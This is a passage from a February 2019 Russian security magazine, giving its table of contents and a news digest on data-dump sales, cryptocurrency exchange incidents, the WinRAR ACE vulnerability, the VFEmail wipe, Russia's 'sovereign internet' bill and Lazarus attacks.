
                                                Февраль 2019
            № 239
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    Вскрыть и изучить
  Полный гайд по потрошению домашних гад жетов

    Хад зимэ!
  Разбира емся, как устроен Hajime, извес тный тро ян для IoT

    CPX 360
  Глав ный ресер чер Check Point о взломе WinRAR и о хакерах на служ бе компании

    Коммерчес кий spyware
  Как действуют популяр ные шпионские программы и как от них защититься

    Постэксплуатация Linux
  Под нима емся от юзера до бога в несколько кликов

    От крыт ка для Wordpress
  Захватыва ем кон троль над сайтом, спря тав код в кар тинке

   Шиф руйся грамот но!
  Изучаем перспективные мессен джеры для приватной переписки

    Антикриминалистика
  Как защитить смартфон от извлечения данных

    Стороже вой лис
  Как нас тро ить Firefox для повышения приватности

    Прицел на лич ные дан ные
  Что мобиль ная реклама может разузнать о пользователе Android

    BearSSL и STM32
  Как реализовать шиф рование для самодельного гад жета

   WWW
  Интересные веб‐сервисы

    Сила OCaml
  Разбира емся с типиза цией и пишем скрипты

    На что способ на ада
  Делаем ути литу для определения гипервизора на полуза бытом языке

    Виртуалка своими руками
  Как обфусцировать код при помощи вир туализации и что делать с такой защитой

    Низкоуров невое обнаруже ние
  Как исполь зовать Zabbix LLD, что бы автоматизировать мониторинг

     Sailﬁsh как замена Android
  Изучаем операционную систему, которая освободит твой телефон от гнета Google

    Бери iPhone!
  Как под видом новых iPhone про дают вос ста новленые полура бочие смартфоны

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ТЕРАБАЙТЫ
УТЕКШИХ ДАННЫХ
Кол лекция номер...
В январе текущего года известный ИБ‐специалист, создатель агрегатора уте‐
чек Have I Been Pwned (HIBP) Трой Хант (Troy Hunt) обратил внимание сооб‐
щества на странный дамп «Коллекция №  1», опуб ликованный в файлооб‐
меннике Mega.
   «Коллекция № 1» представляла собой подборку email‐адресов и паролей,
суммарно насчитывающую 2 692 818 238 записей. Трой Хант писал, что в эту
подборку входят 772 904 991 уникальный email‐адрес и еще 21 222 975 уни‐
кальных паролей.





Хотя многие крупные СМИ поспешили назвать этот дамп «матерью всех уте‐
чек» (Gizmodo) и «крупнейшей коллекци ей утечек на все вре мена» (Mashable),
на самом деле все не так пло хо. Дело в том, что по большей части «Кол‐
лекция № 1» представляет собой «сборник» старых утечек данных и новой
информации в этой под борке не так уж много. Так, сам Трой Хант писал, что
лишь 141 миллион (око ло 18%) email‐адресов из этого сборника не фигури‐
ровали на HIBP ранее и не были частью дру гих извес тных бре шей. Половина
от 21 миллиона уникальных паролей тоже уже давно числилась как «утекшие».
  В феврале 2019 года специалисты компании Recorded Future опубликова‐
ли отчет, в котором рассказали, что им, похоже, удалось идентифици ровать
человека, который собрал эту подборку, а затем выс тавил на продажу.
По данным компании, этот хакер известен под псевдонимом C0rpz и на сос‐
тавление гигант ского дампа, в который вошли многочисленные «утечки» раз‐
личных компаний, у него ушло около трех лет.
   Также специалисты отметили, что «Коллекция № 1» была лишь частью
сборника C0rpz, о чем нетрудно догадаться по самому названию дампа.
Еще в январе мы писали о том, что сущес твуют как минимум пять пронуме‐
рованных частей того же сборника и два дополнения, озаглавленные AN‐
TIPUBLIC и AP MYR & ZABUGOR (о которых во время своего исследования
попросту не знал Трой Хант). Подборка разбита на следующие разделы:
 • ANTIPUBLIC #1 (102,04 Гбайт);
 • AP MYR & ZABUGOR #2 (19,49 Гбайт);
 • Collection #1 (87,18 Гбайт);
 • Collection #2 (528,50 Гбайт);
 • Collection #3 (37,18 Гбайт);
 • Collection #4 (178,58 Гбайт);
 • Collection #5 (40,56 Гбайт).





В общей сложности сборник нас читывает около 3,5 миллиарда записей, то
есть комбинаций данных email‐адрес и пароль, юзернейм и пароль, номер
телефона и пароль и так далее. По информации Recorded Future, C0rpz про‐
дал этот сборник нескольким клиентам, некоторые из них теперь и рас‐
пространяют его бесплатно, через файлооб менники и торренты.
  Известный ИБ‐журналист Брайан Кребс (Brian Krebs) уже писал о том, что
сумел вычислить как минимум двух покупа телей дампа: это хакеры Sanix
и Clorox. В начале января 2019 года последний выложил часть сборника
на форумах Raid Forums, что и привлекло внимание СМИ и экспертов к «Кол‐
лекции № 1».
  При этом Кребс и эксперты Recorded Future сходятся во мнении, что вряд
ли кто‐то из этих хакеров имел какое‐то отношение к исходным утечкам дан‐
ных, из которых состоит сборник. Более того, специалисты еще раз под‐
черкивают, что в основном в подборку вхо дят утечки, о которых уже было
известно, просто раньше эти данные продавались или рас пространялись
отдельно, а здесь они собраны в один «набор».
  Специалисты в очередной раз призвали поль зователей не паниковать
и соблюдать простейшую «цифровую  гигиену»: использовать надежные
и разные пароли для сайтов и сервисов, не забывать про двухфакторную
аутентификацию, не доверять свои личные данные подозрительным компани‐
ям.


Gnosticplayers
В начале фев раля хакер (или группа лиц), скрывающийся под псевдонимом
Gnosticplayers, выставил на продажу на торговой площадке Dream Market сра‐
зу несколько крупных дампов с пользовательскими данными.
  В первую подборку вошли данные 620 миллионов пользователей 16 круп‐
ных сайтов, включая MyHeritage, 500px и Dubsmash. За этот дамп злоумыш‐
ленник суммарно просил около 20 тысяч долларов (в биткойнах).
  После того как информа ция о дампе попала в СМИ, многие компании
были вынуждены признать, что действительно пос традали от атак, и стали
уведомлять о случив шемся пользователей или даже при нудительно сбра‐
сывать пароли. Так, расследова ния начали про водить компании Dubsmash,
500px, EyeEm, Coﬀee Meets Bagel, DataCamp.
  Затем в продаже появился вто рой дамп, содержавший 127 мил лионов
записей о пользователях еще восьми скомпро метированных компаний, вклю‐
чая файлообменник Ge.tt и криптовалютный обменник Coinmama. Эта под‐
борка оценивается в 14 500 долларов в криптовалю те.
  Еще через неделю на Dream Market был опубликован и тре тий дамп, вклю‐
чающий в себя информацию о еще 92,76 миллиона пользователей и оценен‐
ный преступником в 2,6249 BTC (примерно 9400 долларов США). Наиболее
заметна в этой подборке утечка информации о 8 миллионах пользователей
популярного GIF‐хостинга GfyCat. Также в подборку вошли данные 11 мил‐
лионов пользователей рекрутингового портала Jobandtalent, 61 миллиона
пользователей онлайнового редактора фото Pizap и так далее. Как и в прош‐
лых случаях, ни одна из перечисленных хакером компаний ранее не сооб‐
щала о каких‐либо инцидентах с безопасностью и утечках.





При этом Gnosticplayers, кем бы он ни был, охотно общается с представите‐
лями СМИ и уже рассказал журналис там, что не собирается останавливаться.
Он заявлял, что в общей сложности в его распоряжении имеется поряд‐
ка 20 различных баз, некоторые из них он собира ется выставить на продажу,
а другие приберегает для личного пользования. Суммарно эти сборники
вклю чают информацию примерно о миллиарде раз личных аккаунтов, а самые
старые утечки датированы еще 2012 годом.
   Также в беседе с журналистами изда ния ZDNet он заявил, что имеет пря‐
мое отношение имен но к взло му перечисленных компаний, а не просто выс‐
тупает посредником при перепродаже данных.
  Отвечая на вопрос, зачем он это делает, Gnosticplayers объяснил, что его
интересуют всего две вещи: «день ги и разорение американских свиней».
  Дело в том, что к каждому «лоту» зло умышленника также приложено пос‐
лание, где тот поносит американские и британские власти из‐за ареста дру‐
гого хакера, Джорджа Дюка‐Коэна (George Duke‐Cohan), которого Gnostic‐
players в своих сооб щениях называет «молодым и талантливым пареньком».
Тот был членом группировки Apophis Squad, прошлым летом его арестовали,
приговорили  к трем годам тюремного  заключения  в Великобритании,
а теперь ему грозит тюремное заключение сроком до 65 лет в США.


ПОРНОАККАУНТЫ УГОНЯЮТ В 2 РАЗА ЧАЩЕ


Эксперты «Лаборатории Касперского» подсчитали, что преступники стали чаще атаковать поль‐
зователей  порносайтов,  а  точнее  владельцев  пре миум‐аккаунтов  на  таких  ресурсах.
В основном малварь интересуется учетными данными от сайтов Brazzers, Chaturbate,
Pornhub, Myfreecams, Youporn, Wilshing, Motherless, XNXX, X-videos.

Число людей, столкнувшихся с попытками кражи их логинов и паролей для плат ного доступа
к взрослому контенту, за год увеличилось вдвое: с 50 000 в 2017 году до 110 000 в 2018 году.
Одновременно c этим исследователи наблюдают, что в дар кне те стало больше предложений
продать украденные учетные данные: 10 000 в 2018 году против 5000 в 2017 году.

Средняя цена за один аккаунт на черном рын ке сос тавляет 5–10 долларов США.

Количество семейств троянов, которые интересуются такими данными, тоже уве личилось:
в 2017 году их было всего 3, а в 2018 году стало уже 5.

Общее число «порнографического» вредоносного ПО для ПК насчитывает 642 семейства
и 57 типов.

Количество фишинговых страниц, имитирующих какой‐либо крупный порносайт с бесплатным
контентом, увеличилось более чем в 10 раз в четвертом квартале 2018 года.





КРИПТОВАЛЮТНЫЕ
НОВОСТИ
Едва ли не каждый месяц мы рас сказыва ем о новых взломах криптовалютных
бирж, эпидемиях майнинговой малвари, уяз вимос тях в криптовалютных сер‐
висах, приложениях и смарт‐контрактах. К сожалению, февраль 2019 года
не стал исключением и пополнил и без того немалый список «криптовалют‐
ных» инцидентов.


Бан кротство QuadrigaCX
Странная ситуация сложилась вокруг канадской криптовалютной биржи
QuadrigaCX. Более 100 тысяч пользователей не могут получить доступ к сво‐
им средствам и фактически лишились их. На этот раз причиной, похоже, стал
не взлом компании и не экзит‐скам со стороны администрации. Дело в том,
что создатель ресурса Джеральд Коттен (Gerald Cotten) еще в декаб‐
ре 2018 года скончался в Индии от болезни Крона. После его смерти дос туп
к холодному кошельку биржи оказал ся утра чен: как выяснилось, Коттен
единственный имел к нему доступ.
   Согласно информации, опуб ликованной на сайте самой биржи (ныне
неработающей), администра ция QuadrigaCX уже обра тилась в верховный суд
Новой Шотландии, надеясь получить правовую помощь и урегулировать
начинающийся конфликт с пользователями.
  Проблема в том, что о смерти Кот тена объявили не сразу, — пос ле кон‐
чины основателя обменник про должал работать почти месяц, оперируя
средствами с горячего кошелька и фиатных аккаунтов. Уже в январе текущего
года о смерти создателя ресурса на Reddit сооб щила его вдова Дженнифер
Робертсон (Jennifer Robertson), пос ле чего поль зовате ли начали спешно
выводить с QuadrigaCX средс тва, чем и дестабилизировали работу биржи.
  По данным CCN, дос туп к холодному кошельку биржи пытались получить
самыми разными средствами, в том числе нанима ли сторонних специалис тов
для взлома ноутбука Коттена, одна ко все эти попытки не увенчались успе хом.
  В распоряжении издания CoinDesk оказались судебные документы по это‐
му делу, вклю чая данные под присягой показания Дженнифер Робертсон.
По словам вдовы, в недос тупном кошельке хранит ся около 0,5% от всех
токенов Ethereum и огромное количес тво дру гих крип товалют: 26 500 Bitcoin,
11 000 Bitcoin cash, 11 000 Bitcoin cash SV, 35 000 Bitcoin gold, около 200 000
Litecoin, а также 430 000 Ethereum.
  В итоге администра ция QuadrigaCX не может получить доступ примерно
к 190 миллионам дол ларов, причем сооб щается, что около 53 миллионов
не блокированы на холодном кошельке, а заморо жены из‐за споров с треть‐
ими сторонами (включая процессинго вые компании Billerfy и WB21).
  Нужно сказать, что раздосадованные пользователи и представители СМИ
по‐прежнему считают, что в этой исто рии очень мно го белых пятен. К при‐
меру, издание The Wall Street Journal провело собс твенное расследование
и  утверждает,  что одновременно с подачей  заявления о банкротс тве
с QuadrigaCX были выведены от 10 до 24,7 миллиона дол ларов. Другое рас‐
следование, проведенное журналистами CoinDesk, выявило, что еще за нес‐
колько дней до смерти Коттена с биржи вывели около 9000 ETH, распределив
их по счетам на Binance, Kraken и Poloniex.
  В свою очередь, представители Coinbase, тоже попытавшиеся разобрать‐
ся в этом запутанном деле, считают, что экзит‐скама все же не было, а проб‐
лемы у QuadrigaCX начались почти два года назад. Летом 2017 года баг
в смарт‐контракте обернулся для биржи многомиллионными убытками, и,
по  мнению  Coinbase,  администрация  не  смогла  вернуть  QuadrigaCX
в строй — у биржи давно не хва тало денег.


Coinhive зак рывается
Разработчики сервиса Coinhive, который задумы вался как легальная и прос‐
тая альтернатива классичес кой баннерной рекламе, но приобрел огромную
популярность среди прес тупников, анонсирова ли скорое закрытие своего
проекта. Администрация Coinhive призналась, что пос ле последне го хар‐
дфорка Monero хешрейт упал более чем на 50%. Также на решение разработ‐
чиков Coinhive повлиял общий обвал криптовалютного рынка, так как XMR
потеряла около 85% сто имос ти по сравнению с прошлым годом.
  Сообщается,  что  Coinhive  официально  прекратит  работу  8  мар‐
та 2019 года, а у зарегис трированных пользователей будет время до 30 апре‐
ля, чтобы вывести деньги со своих акка унтов.
  Напомню, что Coinhive появился осенью 2017 года и тогда продвигался
как альтернатива классической баннерной рекламе. В итоге Coinhive лишь
породил масштабное явление, которое ИБ‐специалисты назвали криптодже‐
кингом, или браузерным майнингом. Пользователям  стало дос таточно
«неудачно» зайти на какой‐либо сайт, в код которого встроен специальный
JavaScript Coinhive (или дру гого аналогичного сервиса, коих вскоре появи‐
лись десятки), и ресурсы машин жертв уже использовались для добычи крип‐
товалюты Monero.
  Основная проб лема заключалась в том, что Coinhive быстро полюбился
киберпреступникам и владельцы сайтов далеко не всегда знали о наличии
майнинговых скриптов в коде их ресурсов. Дело в том, что сайты стали все
чаще подвергаться взлому с целью интеграции таких скриптов. Различные
ресурсы, вклю чая интернет‐магазины и правитель ственные сайты, буквально
взламывали тысячами, а майнинговые скрипты проникали даже в рекламу
на YouTube, браузерные рас ширения и мобильные приложения.
  Уже в 2018 году операторы сервиса Coinhive, который по‐прежнему оста‐
вал ся самым популярным и используемым, приз нались, что вовсе не желали
создавать инструмент для обо гащения киберпрес тупни ков, и прямо осудили
действия злоумышленников. Также соз датели Coinhive с сожалением конста‐
тировали, что репутация их проекта оставляет желать лучшего, а название
Coinhive практически стало синонимом определенной группы киберпрес‐
туплений. В итоге к настоящему моменту Coinhive и его скрипты давно вне‐
сены в черные списки антивирусов, блокировщиков контента и считаются
мал варью, хотя авторы проекта и готовы с этим поспорить.
  Известный ИБ‐эксперт Джером Сегура (Jérôme Segura) из компании Mal‐
warebytes отмечает, что пик криптоджекин говой активности действительно
пришел ся на конец 2017 — начало 2018 года и эта активность стала снижать‐
ся параллельно падению курсов и интереса к криптовалютам. Очевидно,
доходы от простого браузерного майнин га начали падать и преступники
пытались переключиться, например, на IoT‐устройства (достаточно вспом‐
нить зараже ние 200 тысяч роутеров MikroTik).
  Сегура говорит, что популярность Coinhive также стала снижаться, хотя
один из прямых конкурен тов сервиса, CoinIMP, напротив, даже демонстри‐
ровал некоторый рост. И хотя в этом месяце стало известно, что злоумыш‐
ленники активно используют новую уяз вимость в Drupal и заражают сайты
не чем иным, как май нинговыми скриптами CoinIMP, Сегура убежден, что
это скорее исключение из общей картины и в целом тренд криптоджекинга
уже практически сошел на нет.


Черные списки EOS
Грустная история произошла с неизвес тным владельцем криптовалюты EOS.
22 февраля 2019 года он обна ружил, что его аккаунт был скомпрометирован,
после чего следовал «штатной» процедуре, которая защищает блокчейн EOS
и его пользователей от зло умышленников.
  Данный механизм подразумевает, что постра давший уведомляет о слу‐
чившемся 21 производителя блоков (по сути, это наиболее эффективные
майнеры EOS, которых голосованием выбирает сообщество), после чего они
должны внести скомпрометированный акка унт EOS в черные списки. На эти
черные списки полагаются криптовалютные обменни ки и биржи, чтобы сво‐
евременно банить хакеров и не позволять им выводить похищенные средс‐
тва.
  К сожалению, эта процедура дала сбой. Как объ ясни ли представители
производителя блоков EOS42, чтобы механизм работал как дол жно, свои
черные списки дол жны обновить все производители блоков — если хотя бы
кто‐то один этого не сделает, взло манный акка унт может быть опус тошен.
Именно это и произошло с неназванным поль зователем, который в итоге
лишился  2,06 миллиона EOS  (7,7 миллиона долларов США по  курсу
на момент инцидента).
  Сообщается, что черные списки вовремя не обновили представите ли
платформы games.eos, занимающейся раз работкой игр для блокчей на EOS
и вошедшей в число 21 производителя блоков совсем недавно.
  В итоге злоумышленники успели вывести токены жертвы сразу на несколь‐
ко бирж. Вскоре после публикации отчета EOS42 пред ставите ли биржи Huobi
заморозили аккаунт злоумышленника, но, увы, ана логичным образом пос‐
тупили не все биржи, и в руках прес тупников оста лись немалые деньги.
   Теперь представители EOS42 предложили перес мотреть сис тему работы
черных списков и сделать ее более демократичной. Применяющийся в нас‐
тоящее время подход в EOS42 называют уязвимым, ведь, как показал данный
случай, злоумышленни кам достаточно скомпро метировать хотя бы одного
производителя бло ков, например пообещав «награду» за несвоевременное
обновление черного списка. В EOS42 предлагают вовсе убрать право такого
«вето» для производителей бло ков и исполь зовать обнуление ключей
для аккаунтов из черного списка, что в теории также может позволить постра‐
давшим вернуть свои средства.


НАДЕЖНОСТЬ ПАРОЛЕЙ

Специалисты компании Digital Security протестировали парольные политики 157 веб‑сер-
висов, включая социальные сети, почтовые клиенты, облачные хранилища и интернет‐бан кинг.
Эксперты выяснили, какие сайты предъявляют самые строгие тре бования к созданию паролей
и таким образом потенциально безопасны, какие рекомендации по защите аккаунтов даются
пользователям и при использовании каких сайтов пользователь, скорее все го, станет жертвой
злоумышленника.





Оказалось,  игровые  сервисы  со  временем  (сравнивали  с  аналогичным  исследова‐
нием 2015 года) стали лучше заботиться о парольных политиках, в отличие от платежных сис‐
тем.

Победитель прошлого рейтинга платежных сер висов WebMoney в этот раз зарабо тал –0,5
и сместился на последнее место, а первое место занял Skrill.

Социальные  сети практически не контролируют создание паролей пользовате лями,  что
в результате приводит к повышенному рис ку взлома. Facebook заработал 8 бал лов из воз‐
можных 11,5 и занял первое место среди протес тирован ных соцсетей, на вто ром — StackEx-
change, на третьем месте — «Одноклассники».

Прошли проверку также и почтовые сервисы. Они оказались лидерами по безопасности
парольных политик. Их рейтинг выглядит так: Outlook — 10 баллов, Gmail — 9 баллов, Mail
и Yahoo — 7,5 балла, Яндекс — 6 бал лов, Рамблер — 1,5 балла.





                                     Продолжение статьи →
← Начало статьи





 УЯЗВИМОСТЬ
 WINRAR
  Специалисты компании Check Point обна ружи ли серь езную уяз вимость в Win‐
  RAR и продемонстрировали эксплуата цию данной проблемы. Исследователи
  предупредили, что всем 500 миллионам пользователей WinRAR может угро‐
  жать опасность, так как найденный баг сущес твует примерно 19 лет (sic!).
    Логический баг, найденный ана литиками, связан со сторонней библиоте‐
  кой UNACEV2.DLL, которая вхо дит в состав практически всех версий архи‐
   ватора  с  незапамятных  времен.  Данная  биб лиотека  не  обновлялась
  с 2005 года и отвечает за распаковку архи вов формата ACE. Если учесть воз‐
  раст библиотеки, совсем неудивительно, что иссле дователи Check Point
  обнаружили связанные с ней проб лемы.
     Оказалось, что можно соз дать специальный архив ACE, который при рас‐
  паковке сможет расположить вредоносный файл в произвольном месте,
   в обход фактического пути для рас паковки архива. К примеру, таким образом
  исследователям удалось поместить малварь в директорию Startup, откуда
  вредонос будет запускаться при каждом включении и перезагрузке системы.
     Найденные специалис тами проблемы (CVE‐2018‐20250, CVE‐2018‐20251,
  CVE‐2018‐20252 и CVE‐2018‐20253) были устранены с релизом WinRAR 5.70
  Beta 1  в  январе  текущего  года.  Так  как дос туп  к исходным кодам
  UNACEV2.DLL оказался давно утра чен, было принято решение отказаться
   от поддержки формата ACE вовсе.
    Специалисты настоятель но рекомендовали пользователям как можно ско‐
  рее установить обновления, а также проявить бдительность и до установки
   патчей не открывать архивы ACE, полученные от неизвестных источников
   (например, от незнакомцев по почте).
     Спустя всего неделю пос ле публикации данных о проблеме эксперты 360
   Threat Intelligence Center сообщили, что свежая уязвимость уже находится
  под атакой. Как и опасались ана литики, спамеры начали прикладывать к сво‐
  им посланиям вредоносные архивы, которые при распаковке заражают
  машину пострадавшего бэкдором.
     Как и в примере, который приводили исследователи Check Point, мал варь
  разархивируется прямиком в директорию Startup. Отмечается, что при вклю‐
  ченном UAC вредоно су поп росту не хва тит прав и WinRAR сообщит, что в дос‐
   тупе было отказано, а операция завершилась неуда чей.





 КОНЕЦ VFEMAIL
   Защищенный почтовый сервис VFEmail вряд ли снова заработает в пол ном объеме. 11 фев‐
   раля 2019 года неизвестные злоумышленники про никли на американские серверы проекта
   и уничтожили все данные: отформатировали диски на всех машинах, в результате чего были
   потеряны все виртуальные машины, все бэкапы и файловый сервер.





   →«Да, VFEmail практически полностью уничтожен. Скорее всего, он уже не вернется. Никогда
   не думал, что кого‐то будет настолько вол новать мой безвозмез дный труд, что его захотят
   целиком и полностью уничтожить»
  — основатель VFEmail Рик Ромеро (Rick Romero) у себя в Twitter





 СУВЕРЕННЫЙ РУНЕТ
  В декабре 2018 года сенаторы Андрей Клишас и Людмила Боковая, а также
   депутат Андрей Луговой внесли в Гос думу законопроект № 608767‐7, нап‐
  равленный на защиту устойчивой работы Рунета. Документ быстро стал
  известен как законопроект о «суверенном интернете» или «об изоляции
   Рунета», он предусматривает внесение поправок в законы «О свя зи» и «Об
  информации, информационных технологи ях и о защите информации».
     Законопроект направлен на защиту Рунета от внешних угроз и должен
  позволить российским влас тям контролировать точки соединения россий‐
  ского сегмента интернета с внешним миром. То есть в слу чае необ ходимости
  инфраструктура Рунета должна быть способна работать в полной изоляции.
  Причем в пояснительной записке к документу сказано, что тот «подготовлен
  с учетом агрессив ного характера принятой в сентябре 2018 года стратегии
  национальной кибербезопасности США, где декларируется принцип сох‐
  ранения мира силой».
     Законопроект определяет необходимые пра вила маршру тизации трафика.
  Еще одна  цитата из пояснительной записки: «Создается возможность
  для минимизации переда чи за рубеж данных, которыми обмениваются между
  собой российские поль зователи. Определяются трансграничные линии связи
  и точки обмена трафиком. Их владельцы, операто ры свя зи обязываются
  при возникновении угро зы обеспечить возможность централизованного
  управления трафиком».
     12 февраля 2019 года законопроект был принят в первом чтении, и на
  страницах «Роскомсвободы» уже можно найти подробную расшифровку
  заседания Госдумы.
    Напомню, что ранее один из авто ров ини циати вы Андрей Клишас утвер‐
   ждал, что на исполнение закона будет потрачено 20 миллиардов рублей.
  При этом в обосновании к законопроекту он писал, что бюджетных средств
  на его инициативу практически не потребуется. Затем «Интерфакс» сообщил,
   что  в  ближайшие  три  года  на  законоп роект  планиру ют  потратить
  более 1,8 миллиарда рублей и средства на соз дание Центра управления
  сетью связи общего пользования предус мотрены в бюджете на 2019 год
   в размере почти 600 миллионов рублей. Обсуждение в Госдуме, к сожале‐
  нию, ясности не добавило, и в вопросах финансирования проекта по‐преж‐
  нему таится мно жество неизвестных.
     Также стоит отметить, что ранее законопроект уже раскритиковали эк‐
  сперты и представите ли отрасли. Так, члены Экспертного совета при Пра‐
   вительстве РФ сооб щали, что законопроект имеет недостаточно проз рачные
   цели, предлагает дублировать полномочия разных органов, не конкре тизи‐
   рует, «в чем конкретно состоят угрозы», а реализация законопроекта на деле,
  скорее всего, потребует огромных финансовых вливаний.


 60% БИРЖ ВЗЛОМАНЫ 2 ХАК‐ГРУППАМИ

   По данным аналитической фир мы Chainalysis, всего 2 хакерские группы ответс твен ны за 60%
   публично известных инцидентов, связанных с атаками на крип товалют ные биржи. Исследова‐
   тели подсчитали, что преступники похитили уже около 1 миллиарда долларов.

  В докладе экспертов группировки фигурируют под кодовыми названиями Alpha и Beta.
   При этом в документе ска зано, что более крупная группировка, Alpha, представляет собой
   огромную организацию с жес тким кон тролем и далеко не всег да прес ледует только финан‐
   совую выгоду. В свою очередь, группа Beta намного меньше, организо вана хуже и интересу‐
   ется исключительно деньгами.

   Один «средний» взлом приносит хакерам из этих групп порядка 90 000 000 долларов США.

  В среднем похищенные с бирж средства перемещаются около 5000 раз. Пос ле это го прес‐
   тупники, как правило, выжидают порядка 40 дней и лишь потом начинают конвертировать
   криптовалюту в фиат.

   По меньшей мере 50% похищен ных средств обналичиваются через сервисы кон вертации
   в течение 112 дней после инциден та, и 75% средств обналичиваются спустя 168 дней.

   При этом группа Alpha относится к «запутыванию следов» ответс твеннее сво их «коллег», но и
   обналичивает украденное быстрее. Так, зачастую украден ная криптовалюта проходит через
   15 000 и более транзакций, и 75% похищенных средств обналичиваются в течение 30 дней
   после атаки. Участники группы Beta, в свою очередь, предпочитают выжидать от 6 до 18
   месяцев.





 ШИФРОВАНИЕ И FI‐
 DO2 ДЛЯ ВСЕХ
  В этом месяце разработчики Google порадовали пользователей мобильных
  устройств сразу двумя хорошими новостями.
     Во‐первых, в начале месяца был представлен новый метод шифрования
   Adiantum, который ориентирован на бюджетные устройства, где исполь‐
  зование AES невозможно. Дело в том, что поль зователям Android доступна
  поддержка алгоритма шифрования AES (Advanced  Encryption  Standard),
  который отлично работа ет с новейшими процессорами за счет ARMv8 Cryp‐
   tography Extensions. Одна ко на менее мощных устройствах, начиная от бюд‐
  жетных смартфонов и заканчивая умными часами и телевизорами, возможны
  проблемы. Такие гаджеты осна щены менее мощными процессорами, где
  аппаратной поддержки AES «из коробки» попросту нет (например, ARM Cor‐
   tex‐A7).
    Инженеры Google объясняют, что на таких устрой ствах AES работает нас‐
   только медленно, что это портит пользователю весь опыт взаимодей ствия
  с устройством. И хотя шифрование хранилища стало обязательным условием
  еще в 2015 году, с релизом Android 6.0, маломощные устройства были «осво‐
  бождены» от этого, так как при вклю чении AES они больше тормозят, чем
  работают. В таких слу чаях шифрование либо отключено по умол чанию
  во избежание проб лем, либо вообще удалено из Android.
    Именно для таких устройств и был соз дан Adiantum, представляющий
  собой реаль ную альтернативу AES‐128‐CBC‐ESSIV и AES‐256‐XTS. Разработ‐
   чики приводят простой пример: на про цес соре ARM Cortex‐A7 Adiantum
  выпол няет шифрование и дешифрование в секторах раз мером 4096 байт
  с показателями око ло 10,6 цикла на байт, что примерно в пять раз быстрее
  AES‐256‐XTS.





  Во‐вторых, спе циалисты альянса FIDO (Fast IDentity Online) сообщили, что все
  устройства, работающие под управлением Android 7.0 (Nougat) и выше,
  теперь сертифицированы для работы с FIDO2 и уже было выпуще но соот‐
   ветствующее обновление для Google Play Services.
    Фактически это озна чает, что теперь для доступа к сервисам и приложе‐
  ниям владельцы гаджетов смогут использовать не только пароли (а это спе‐
  циалисты уже дав но называют небезопас ным), но и альтернативные способы
   аутентификации: биометрию  (распознавание  лица,  отпе чатков  пальцев,
  радужки глаза, если устройство это поддержи вает), PIN‐коды и графичес кие
  клю чи.
     Представите ли Google и FIDO надеются, что нововведение позволит луч‐
  ше обезопасить пользователей и их данные, так как биометрические данные
  гораздо сложнее подделать и похитить. Кроме того, стандарт FIDO2 под‐
  разумевает, что аутентификация происходит локаль но и приватные данные
  не передаются приложениям и сервисам, в которые пытается войти поль‐
   зователь.



        «Важная часть этой технологии, которую час то оставляют без вни-
         мания, — это даже не тот факт, что пользовате ли могут применять
        биометричес кую аутентифика цию, а уход от модели shared secret.
        Данная модель под разуме вает, что вы и сер вис, с которым вы вза-
        имодейству ете, должны знать некий „сек рет“ (такой как ваш пароль).
        Асим метрич ная модель под разуме вает, что вы лишь должны доказать,
         что зна ете сам „сек рет“, но уда ленному сер вису его знать не нужно.
        Во многих отношениях это большое улуч шение. К примеру, в слу чае
         утеч ки ваших данных на стороне сер вера нич то не ком прометирует
        ваши клю чи, которые вы используете для дос тупа к сер вису», — объ-
         ясняет спе циалист Google Крис тиан Бранд (Christiaan Brand).


  БАНКИ НЕ ГОТОВЫ

   Group‐IB проанализировала высокотехнологичные прес тупления 2018 года, к реаги рованию
   на которые привлекались ее эксперты‐киберкриминалисты. Основная мас са хакерских атак
   вновь пришлась на финансовый сектор, но большинство бан ков  (74%) оказались к это му
   не готовы.





  Общее количество реагирований (Incident Response) Лаборатории компьютерной криминалис‐
   тики Group‐IB выросло более чем в 2 раза по сравнению с 2017 годом.

  В 29% банков была обнаруже на активная малварь, а в 52% случаев выявлены следы совер‐
   шения атак в прошлом.

   Перечень основных угроз, с которыми стал кивались пос традавшие компании, возглавляют це-
  левые атаки, конкурентный шпи онаж, атаки с помощью вирусов‑шиф роваль-
  щиков, криптовалют ный майнинг.

  74% атакованных в 2018 году банков не были готовы к хакерским атакам: более 60% не спо‐
   собны централизованно управлять своей сетью, особен но в тер ритори ально распре деленной
   инфраструктуре; около 80% не имеют достаточной глубины журналирования событий про‐
   тяженностью более месяца.

   Более 65% банков тратили на согласование работ между под разде лениями более 4 часов.
   При этом среднее время, потрачен ное на совещания, сог ласования дос тупов, регламен тные
   работы в рамках одного реагирования при наступлении инцидента, составляло 12 часов.

   Более 60% пострадавших бан ков неспособны в сжатые сроки провес ти централизованную
   единоразовую смену всех паролей, что позволяет злоумышленникам атаковать новые цели
   изнутри взломанной инфраструктуры бан ка.


  Выявлять следы заражения и несанкционированной активности в сети не умеет вовсе или уме‐
   ет недостаточно хорошо персонал 70% организаций.





 LAZARUS АТАКОВАЛА
РОССИЮ
  Аналитики компании Check Point рас ска зали, что северокорейская хак‐группа
   Lazarus (она же HIDDEN COBRA, Guardians of Peace, ZINC, NICKEL ACADEMY
  и APT38) начала атаковать российские компании. Исследователи утвержда‐
   ют, что это беспрецедентный и пер вый зафиксированный случай, и подчерки‐
   вают, что чаще всего Lazarus ата куют цели в Южной Корее и Японии. Стоит
  отметить,  что, по данным ана литиков  FireEye, «на счету» Lazarus атаки
   как минимум на 11 разных стран мира. Также напомню, что в декаб‐
  ре 2018 года специалис ты McAfee предупреждали о вре доносной кампании
   Sharpshooter, которая тоже могла быть свя зана с Lazarus, а жертвами зло‐
  умышленников стали 87 компаний и организаций в разных странах, включая
  Россию.
     Эксперты Check Point считают, что за обна руженными атаками стоит под‐
  разделение Lazarus, известное как Bluenoroﬀ и занимающееся преиму щес‐
   твенно финансовыми операциями. Какие именно компании и организации
   стали целями злоумышленников, неясно, исследова тели опираются на вре‐
  доносные образцы, загруженные на VirusTotal с рос сийских IP‐адресов.
     Чаще все го кампания, обнаруженная исследователями, начинается с тар‐
  гетированных писем, содержащих вредоносные архивы ZIP, внутри которых
   находятся файлы Oﬃce и PDF, созданные специально для рус скоязычной
  аудитории (например, в одном случае пись мо якобы содержало NDA россий‐
  ской компании StarForce Technologies).
     Как нетрудно догадаться, такие документы содержат вре доносные мак‐
  росы, срабатывание которых приводит к загрузке и исполнению скрипта VBS,
  причем зачастую скачивание происхо дит с Dropbox. VBS, в свою очередь,
